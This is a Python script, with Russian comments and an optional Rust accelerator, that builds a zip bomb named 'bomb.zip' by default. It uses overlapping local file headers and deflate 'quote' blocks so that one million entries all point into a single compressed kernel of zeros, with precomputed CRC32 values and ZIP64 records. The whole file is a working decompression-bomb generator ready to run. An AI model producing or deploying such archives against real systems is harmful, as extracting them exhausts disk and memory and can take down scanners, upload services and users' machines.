import zlib
import struct

import struct, zlib, array

# ── Импорт Rust-расширения с fallback ────────────────────────────────

try:
    import backward as _bw
    _HAS_RUST = True
    print("backend: Rust (backward.so)")
except ImportError:
    _HAS_RUST = False
    print("backend: pure Python (fallback)")

# ══════════════════════════════════════════════════════════════════════
#  crc32_combine — нужен только для Python-fallback
# ══════════════════════════════════════════════════════════════════════

_GF2_DIM = 32

def _mat_times_py(mat, vec):
    s, idx = 0, 0
    while vec:
        if vec & 1:
            s ^= mat[idx]
        vec >>= 1
        idx += 1
    return s

def _mat_square_py(mat):
    return [_mat_times_py(mat, mat[n]) for n in range(_GF2_DIM)]

def _build_base_odd_py():
    odd = [0] * _GF2_DIM
    odd[0] = 0xEDB88320
    for n in range(1, _GF2_DIM):
        odd[n] = 1 << (n - 1)
    even = _mat_square_py(odd)
    return _mat_square_py(even)

_BASE_ODD_PY = _build_base_odd_py()

def _crc32_combine_py(crc1, crc2, len2):
    if len2 == 0:
        return crc1
    odd = list(_BASE_ODD_PY)
    n = len2
    while True:
        even = _mat_square_py(odd)
        if n & 1:
            crc1 = _mat_times_py(even, crc1)
        n >>= 1
        if n == 0:
            break
        odd = _mat_square_py(even)
        if n & 1:
            crc1 = _mat_times_py(odd, crc1)
        n >>= 1
        if n == 0:
            break
    return crc1 ^ crc2

# ══════════════════════════════════════════════════════════════════════
#  ZIP-структуры (нужны только для Python-fallback и write pass)
# ══════════════════════════════════════════════════════════════════════

def make_quote_header(length):
    assert 0 < length <= 0xFFFF
    return struct.pack('<BHH', 0x00, length, (~length) & 0xFFFF)

def make_lfh(filename, crc, comp_size, uncomp_size):
    fname = filename.encode()
    return struct.pack(
        '<IHHHHHIIIHH',
        0x04034b50, 20, 0, 8, 0, 0,
        crc, comp_size, uncomp_size,
        len(fname), 0,
    ) + fname

def make_cdh(filename, crc, comp_size, uncomp_size, offset):
    fname = filename.encode()
    return struct.pack(
        '<IHHHHHHIIIHHHHHII',
        0x02014b50, 20, 20, 0, 8, 0, 0,
        crc, comp_size, uncomp_size,
        len(fname), 0, 0, 0, 0, 0, offset,
    ) + fname

def make_eocd(num_entries: int, cd_size: int, cd_offset: int) -> bytes:
    if num_entries > 0xFFFF or cd_size > 0xFFFFFFFF or cd_offset > 0xFFFFFFFF:
        # ZIP64 End of Central Directory Record
        zip64_eocd = struct.pack(
            '<IQHHIIQQQQ',
            0x06064b50,          # ZIP64 EOCD signature
            44,                  # size of ZIP64 EOCD record
            45,                  # version made by
            45,                  # version needed
            0,                   # disk number
            0,                   # disk with CD start
            num_entries,         # entries on this disk
            num_entries,         # total entries
            cd_size,             # CD size
            cd_offset,           # CD offset
        )
        # ZIP64 End of Central Directory Locator
        zip64_locator = struct.pack(
            '<IIQI',
            0x07064b50,          # locator signature
            0,                   # disk with ZIP64 EOCD
            cd_offset + cd_size, # offset of ZIP64 EOCD
            1,                   # total disks
        )
        # Обычный EOCD (со значениями 0xFFFF/0xFFFFFFFF как маркер ZIP64)
        eocd = struct.pack(
            '<IHHHHIIH',
            0x06054b50,
            0, 0,
            0xFFFF,              # маркер: смотри ZIP64
            0xFFFF,
            0xFFFFFFFF,          # маркер: смотри ZIP64
            0xFFFFFFFF,
            0,
        )
        return zip64_eocd + zip64_locator + eocd
    else:
        # Обычный ZIP32
        return struct.pack(
            '<IHHHHIIH',
            0x06054b50, 0, 0,
            num_entries, num_entries,
            cd_size, cd_offset, 0,
        )

def _lfh_size(i):
    return 30 + len(str(i)) + 4

# ══════════════════════════════════════════════════════════════════════
#  Backward pass
# ══════════════════════════════════════════════════════════════════════

def _run_backward_rust(num_files, kernel_size, kernel_comp, kernel_uncomp):
    """Весь цикл в Rust — один вызов, возвращает три array."""
    kernel_crc32 = zlib.crc32(kernel_uncomp) & 0xFFFFFFFF

    raw_crcs, raw_comp, raw_uncomp = _bw.run_backward_pass(
        num_files,
        kernel_size,
        kernel_crc32,
        len(kernel_comp),
    )

    # bytes → array без лишних копий
    crcs         = array.array('I'); crcs.frombytes(raw_crcs)
    comp_sizes   = array.array('Q'); comp_sizes.frombytes(raw_comp)
    uncomp_sizes = array.array('Q'); uncomp_sizes.frombytes(raw_uncomp)

    return crcs, comp_sizes, uncomp_sizes


def _run_backward_python(num_files, kernel_size, kernel_comp, kernel_uncomp):
    """Оригинальный Python-fallback."""
    crcs         = array.array('I', [0] * (num_files + 1))
    comp_sizes   = array.array('Q', [0] * (num_files + 1))
    uncomp_sizes = array.array('Q', [0] * (num_files + 1))

    suffix_crc = zlib.crc32(kernel_uncomp) & 0xFFFFFFFF
    suffix_len = kernel_size
    cur_comp   = len(kernel_comp)
    cur_uncomp = kernel_size

    for i in range(num_files, 0, -1):
        if i % 100_000 == 0:
            print(f"    планирование: {i:>10,}")

        crcs[i]         = suffix_crc
        comp_sizes[i]   = cur_comp
        uncomp_sizes[i] = cur_uncomp

        lfh        = make_lfh(f"{i}.txt", suffix_crc, cur_comp, cur_uncomp)
        lfh_crc    = zlib.crc32(lfh) & 0xFFFFFFFF
        suffix_crc = _crc32_combine_py(lfh_crc, suffix_crc, suffix_len)
        suffix_len += len(lfh)
        cur_comp   += 5 + len(lfh)
        cur_uncomp += len(lfh)

    return crcs, comp_sizes, uncomp_sizes

# ══════════════════════════════════════════════════════════════════════
#  Генератор
# ══════════════════════════════════════════════════════════════════════

def generate_zip_file(
    filename:    str = "bomb.zip",
    num_files:   int = 1_000_000,
    kernel_size: int = 1024 * 1024,
):
    print(f"Generating '{filename}': {num_files:,} files, "
          f"{kernel_size // 1024} KB kernel")

    # Компрессия ядра
    kernel_uncomp = b"\x00" * kernel_size
    zobj = zlib.compressobj(level=9, wbits=-15)
    kernel_comp = zobj.compress(kernel_uncomp) + zobj.flush()

    # ── Backward pass ─────────────────────────────────────────────────
    print("  Backward pass (planning)...")

    if _HAS_RUST:
        crcs, comp_sizes, uncomp_sizes = _run_backward_rust(
            num_files, kernel_size, kernel_comp, kernel_uncomp
        )
    else:
        crcs, comp_sizes, uncomp_sizes = _run_backward_python(
            num_files, kernel_size, kernel_comp, kernel_uncomp
        )

    # ── Write pass ────────────────────────────────────────────────────
    FLUSH_SIZE = 4 * 1024 * 1024

    offsets        = array.array('Q', [0] * (num_files + 1))
    current_offset = 0

    print("  Writing...")
    with open(filename, "wb") as f:
        buf = bytearray()

        def flush():
            if buf:
                f.write(buf)
                buf.clear()

        # LFH + quote headers
        for i in range(1, num_files + 1):
            if i % 100_000 == 0:
                print(f"    запись LFH: {i:>10,}")

            offsets[i] = current_offset

            lfh = make_lfh(f"{i}.txt", crcs[i], comp_sizes[i], uncomp_sizes[i])
            buf += lfh
            current_offset += len(lfh)

            if i < num_files:
                buf += make_quote_header(_lfh_size(i + 1))
                current_offset += 5

            if len(buf) >= FLUSH_SIZE:
                flush()

        flush()

        # Compressed kernel
        f.write(kernel_comp)
        current_offset += len(kernel_comp)

        # Central Directory
        print("  Writing central directory...")
        cd_start = current_offset
        for i in range(1, num_files + 1):
            if i % 100_000 == 0:
                print(f"    CD: {i:>10,}")

            cdh = make_cdh(
                f"{i}.txt", crcs[i], comp_sizes[i],
                uncomp_sizes[i], offsets[i],
            )
            buf += cdh
            current_offset += len(cdh)

            if len(buf) >= FLUSH_SIZE:
                f.write(buf)
                buf.clear()

        if buf:
            f.write(buf)

        # EOCD
        f.write(make_eocd(num_files, current_offset - cd_start, cd_start))

    print(f"Done!  →  {filename}")


if __name__ == "__main__":
    file_name = input("What would you like to call the zip?: ")
    generate_zip_file(file_name)